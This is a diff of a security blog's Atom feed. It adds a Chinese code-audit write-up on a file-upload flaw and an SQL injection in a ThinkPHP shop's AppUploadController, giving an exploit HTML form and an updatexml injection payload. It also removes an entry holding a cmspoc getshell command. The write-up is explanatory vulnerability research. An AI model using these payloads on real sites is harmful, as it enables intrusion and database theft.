@@ -220,13 +220,61 @@
   </entry>
   
   <entry>
+    <title>某商城文件上传漏洞与SQL注入漏洞</title>
+    <link href="http://chybeta.github.io/2018/03/21/%E6%9F%90%E5%95%86%E5%9F%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E4%B8%8ESQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://chybeta.github.io/2018/03/21/某商城文件上传漏洞与SQL注入漏洞/</id>
+    <published>2018-03-21T04:32:59.000Z</published>
+    <updated>2018-03-23T00:39:40.289Z</updated>
+    
+    <content type="html"><![CDATA[<p>某商城文件上传漏洞与SQL注入漏洞  Getshell。<br><a id="more"></a><br>首发于：<a href="https://xianzhi.aliyun.com/forum/topic/2203" target="_blank" rel="external">某商城文件上传漏洞与SQL注入漏洞</a></p>
+<h1 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h1><p>定位到Application/Home/Controller/AppUploadController.class.php：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</div><div class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">AppUploadController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">commentUpload</span><span class="params">()</span></span>&#123;</div><div class="line">        $user_id=$_POST[<span class="string">'user_id'</span>];</div><div class="line">        $goods_id=$_POST[<span class="string">'goods_id'</span>];</div><div class="line">        $order_id=$_POST[<span class="string">'order_id'</span>];</div><div class="line">        <span class="keyword">if</span>($_FILES) &#123;</div><div class="line">            $filename = $_FILES[<span class="string">'img'</span>][<span class="string">'name'</span>];</div><div class="line">            $tmpname = $_FILES[<span class="string">'img'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">            <span class="keyword">if</span> (move_uploaded_file($tmpname, <span class="string">'./Uploads/show/'</span> . $filename)) &#123;</div><div class="line">                $path[<span class="string">'path'</span>]=<span class="string">'/Uploads/show/'</span> . $filename;</div><div class="line">                $path[<span class="string">'create_time'</span>]=time();</div><div class="line">                $r=M(<span class="string">'images'</span>)-&gt;add($path);</div><div class="line">                $show_pic=M(<span class="string">'order_comment'</span>)-&gt;where([</div><div class="line">                    <span class="string">'goods_id'</span>=&gt;$goods_id</div><div class="line">                ])-&gt;getField(<span class="string">'show_pic'</span>);</div><div class="line">                <span class="keyword">if</span>(!<span class="keyword">empty</span>($show_pic)) &#123;</div><div class="line">                    $show[<span class="string">'show_pic'</span>] = $show_pic . <span class="string">','</span> . $r;</div><div class="line">                    M(<span class="string">'order_comment'</span>)-&gt;where([</div><div class="line">                        <span class="string">'goods_id'</span> =&gt; $goods_id,</div><div class="line">                        <span class="string">'order_id'</span>=&gt;$order_id,</div><div class="line">                        <span class="string">'user_id'</span>=&gt;$user_id</div><div class="line">                    ])-&gt;save($show);</div><div class="line">                &#125;<span class="keyword">else</span>&#123;</div><div class="line">                    $show[<span class="string">'show_pic'</span>] = $r;</div><div class="line">                    M(<span class="string">'order_comment'</span>)-&gt;where([</div><div class="line">                        <span class="string">'goods_id'</span> =&gt; $goods_id,</div><div class="line">                        <span class="string">'order_id'</span>=&gt;$order_id,</div><div class="line">                        <span class="string">'user_id'</span>=&gt;$user_id</div><div class="line">                    ])-&gt;save($show);</div><div class="line">                &#125;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                $data = json_encode($_FILES);</div><div class="line">                <span class="keyword">echo</span> $data;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">headerUpload</span><span class="params">()</span></span>&#123;</div><div class="line">        $user_id=$_POST[<span class="string">'user_id'</span>];</div><div class="line">        <span class="keyword">if</span>($_FILES) &#123;</div><div class="line">            $filename = $_FILES[<span class="string">'img'</span>][<span class="string">'name'</span>];</div><div class="line">            $tmpname = $_FILES[<span class="string">'img'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">            <span class="keyword">if</span> (move_uploaded_file($tmpname,<span class="string">'./Uploads/header/'</span> . $filename)) &#123;</div><div class="line">                $head_img[<span class="string">'user_header'</span>]=<span class="string">'/Uploads/header/'</span> . $filename;</div><div class="line">                $head_img[<span class="string">'user_id'</span>]=$user_id;</div><div class="line">                $find = M(<span class="string">'user_header'</span>)-&gt;where(<span class="keyword">array</span>(<span class="string">'user_id'</span> =&gt; $user_id))-&gt;find();</div><div class="line">                <span class="keyword">if</span> (!<span class="keyword">empty</span>($find)) &#123;<span class="comment">//则数据库里已存在头像</span></div><div class="line">                    M(<span class="string">'user_header'</span>)-&gt;where(<span class="string">'user_id=%s'</span>,$user_id)-&gt;save($head_img);</div><div class="line">                &#125; <span class="keyword">else</span> &#123;<span class="comment">//数据库里不存在头像</span></div><div class="line">                    M(<span class="string">'user_header'</span>)-&gt;add($head_img);</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">echo</span> json_encode(<span class="string">'上传成功'</span>);</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                $data = json_encode($_FILES);</div><div class="line">                <span class="keyword">echo</span> $data;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>接受到文件后，没有过滤的直接进行了<code>move_uploaded_file</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">public function commentUpload()&#123;</div><div class="line">    ...</div><div class="line">    $filename = $_FILES[&apos;img&apos;][&apos;name&apos;];</div><div class="line">    $tmpname = $_FILES[&apos;img&apos;][&apos;tmp_name&apos;];</div><div class="line">    if (move_uploaded_file($tmpname, &apos;./Uploads/show/&apos; . $filename))</div><div class="line">    ...</div><div class="line">&#125;</div><div class="line"></div><div class="line">public function headerUpload()&#123;</div><div class="line">    ...</div><div class="line">    $filename = $_FILES[&apos;img&apos;][&apos;name&apos;];</div><div class="line">    $tmpname = $_FILES[&apos;img&apos;][&apos;tmp_name&apos;];</div><div class="line">    if (move_uploaded_file($tmpname,&apos;./Uploads/header/&apos; . $filename))</div><div class="line">    ...</div></pre></td></tr></table></figure></p>
+<p>因此直接构造表单，以<code>commentUpload</code>为例:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/index.php/Home/AppUpload/commentUpload"</span> <span class="attr">method</span>=<span class="string">"post"</span></span></div><div class="line"><span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"img"</span> <span class="attr">id</span>=<span class="string">"file"</span> /&gt;</span> </div><div class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>直接上传phpinfo.php，之后访问 <a href="http://127.0.0.1/Uploads/show/phpinfo.php" target="_blank" rel="external">http://127.0.0.1/Uploads/show/phpinfo.php</a></p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180321203715-95f4b6da-2d04-1.jpeg" alt="6.jpg"><br>官网demo</p>
+<h1 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h1><p>观察一下上面代码中的sql查询语句，在headerUpload函数中：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">headerUpload</span><span class="params">()</span></span>&#123;</div><div class="line">    $user_id=$_POST[<span class="string">'user_id'</span>];</div><div class="line">    <span class="keyword">if</span>($_FILES) &#123;</div><div class="line">        ...</div><div class="line">        <span class="keyword">if</span> (move_uploaded_file($tmpname,<span class="string">'./Uploads/header/'</span> . $filename)) &#123;</div><div class="line">            ...</div><div class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>($find)) &#123;<span class="comment">//则数据库里已存在头像</span></div><div class="line">                M(<span class="string">'user_header'</span>)-&gt;where(<span class="string">'user_id=%s'</span>,$user_id)-&gt;save($head_img);</div><div class="line">            &#125; </div><div class="line">            ...</div><div class="line">        &#125;</div><div class="line">        ...</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>首先<code>user_id</code>是可控的。我们跟进tp的<code>where</code>方法，定义在 Core/Library/Think/Model.class.php:1783<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">where</span><span class="params">($where,$parse=null)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(!is_null($parse) &amp;&amp; is_string($where)) &#123;</div><div class="line">        <span class="keyword">if</span>(!is_array($parse)) &#123;</div><div class="line">            $parse = func_get_args();</div><div class="line">            array_shift($parse);</div><div class="line">        &#125;</div><div class="line">        $parse = array_map(<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;db,<span class="string">'escapeString'</span>),$parse);</div><div class="line">        $where =   vsprintf($where,$parse);</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
+<p>此时传入的参数<code>parse</code>即可控的<code>$user_id</code>，然后通过<code>vsprintf($where,$parse)</code>将其格式化输出到where语句中。这里并没有严格的对数据类型进行检验，虽然前面存在<code>escapeString</code>的过滤，但只要不引入引号即可。</p>
+<p>要进入该if判断中，需要满足<code>!empty($find)</code>，也即数据库里已存在头像。因此可以先前台注册一个用户，登陆后在cookie字段获取到对应的user_id，如图所示user_id=275。</p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180321194504-4c075dfe-2cfd-1.jpeg" alt="2.jpg"></p>
+<p>在个人资料处先上传一张头像</p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180321194527-59508472-2cfd-1.jpeg" alt="3.jpg"></p>
+<p>确保上传成功后。选择打开下面的exp.html上传，并抓包：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/index.php/Home/AppUpload/headerUpload"</span> <span class="attr">method</span>=<span class="string">"post"</span></span></div><div class="line"><span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"img"</span> <span class="attr">id</span>=<span class="string">"file"</span> /&gt;</span> </div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"user_id"</span> <span class="attr">value</span>=<span class="string">"275"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>在user_id后添加payload，比如<code>or updatexml(1,concat(0x7e,(user())),0)</code></p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180321194539-609b2c00-2cfd-1.jpeg" alt="4.jpg"></p>
+<p>查看sql日志：</p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180321194543-6327e166-2cfd-1.jpeg" alt="5.jpg"></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;某商城文件上传漏洞与SQL注入漏洞  Getshell。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
+    
+    
+      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="getshell" scheme="http://chybeta.github.io/tags/getshell/"/>
+    
+      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+      <category term="代码执行" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
+    
+      <category term="dedecms" scheme="http://chybeta.github.io/tags/dedecms/"/>
+    
+  </entry>
+  
+  <entry>
     <title>XSStrike 源码阅读</title>
     <link href="http://chybeta.github.io/2018/03/10/XSStrike-%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"/>
     <id>http://chybeta.github.io/2018/03/10/XSStrike-源码阅读/</id>
     <published>2018-03-10T00:21:12.000Z</published>
-    <updated>2018-03-16T00:51:26.293Z</updated>
+    <updated>2018-03-23T00:40:31.902Z</updated>
     
-    <content type="html"><![CDATA[<p>XSStrike 源码阅读   </p>
+    <content type="html"><![CDATA[<p>XSStrike 源码阅读<br><a id="more"></a> </p>
 <h1 id="XSStrike"><a href="#XSStrike" class="headerlink" title="XSStrike"></a>XSStrike</h1><p><img src="https://camo.githubusercontent.com/6395848cfcc0fd41c1f987cea5e8f954844bccd0/68747470733a2f2f692e696d6775722e636f6d2f4a3237756f52492e706e67" alt=""></p>
 <p>XSStrike是一款XSS扫描工具。</p>
 <p>Github地址: <a href="https://github.com/UltimateHackers/XSStrike" target="_blank" rel="external">https://github.com/UltimateHackers/XSStrike</a></p>
@@ -400,8 +448,7 @@
     
     <summary type="html">
     
-      &lt;p&gt;XSStrike 源码阅读   &lt;/p&gt;
-&lt;h1 id=&quot;XSStrike&quot;&gt;&lt;a href=&quot;#XSStrike&quot; class=&quot;headerlink&quot; title=&quot;XSStrike&quot;&gt;&lt;/a&gt;XSStrike&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://camo
+      &lt;p&gt;XSStrike 源码阅读&lt;br&gt;
     
     </summary>
     
@@ -613,9 +660,9 @@
     
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
-      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
       <category term="getshell" scheme="http://chybeta.github.io/tags/getshell/"/>
+    
+      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
       <category term="代码执行" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
     
@@ -1339,9 +1386,9 @@ $output .= &quot;if ({$dec}) {\n&quot;;
     
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
-      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
       <category term="getshell" scheme="http://chybeta.github.io/tags/getshell/"/>
+    
+      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
   </entry>
   
@@ -1564,36 +1611,6 @@ $output .= &quot;if ({$dec}) {\n&quot;;
       <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
     
       <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>BEECMS v4.0_R_20160525 文件上传漏洞分析</title>
-    <link href="http://chybeta.github.io/2017/11/14/BEECMS-v4-0-R-20160525-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    <id>http://chybeta.github.io/2017/11/14/BEECMS-v4-0-R-20160525-文件上传漏洞分析/</id>
-    <published>2017-11-14T05:12:50.000Z</published>
-    <updated>2017-11-20T06:04:56.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>其实这个洞早就出来了。<br>只不过几天前看到<a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-31579" target="_blank" rel="external">cnvd</a>上有人提交了。<br>漏洞利用过程挺好玩的，分析一波。</p>
-<a id="more"></a>
-<h1 id="漏洞复现：cmspoc"><a href="#漏洞复现：cmspoc" class="headerlink" title="漏洞复现：cmspoc:"></a>漏洞复现：<a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="external">cmspoc</a>:</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python cmspoc.py -u http://vuln.com/index.php -t beecms -s v40_fileupload_gethshell.py</div></pre></td></tr></table></figure>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171115/tty.gif?raw=true" alt=""></p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="变量覆盖进后台"><a href="#变量覆盖进后台" class="headerlink" title="变量覆盖进后台"></a>变量覆盖进后台</h2><h2 id="后台任意文件上传"><a href="#后台任意文件上传" class="headerlink" title="后台任意文件上传"></a>后台任意文件上传</h2>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;其实这个洞早就出来了。&lt;br&gt;只不过几天前看到&lt;a href=&quot;http://www.cnvd.org.cn/flaw/show/CNVD-2017-31579&quot;&gt;cnvd&lt;/a&gt;上有人提交了。&lt;br&gt;漏洞利用过程挺好玩的，分析一波。&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
-    
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="文件上传" scheme="http://chybeta.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
     
   </entry>
   
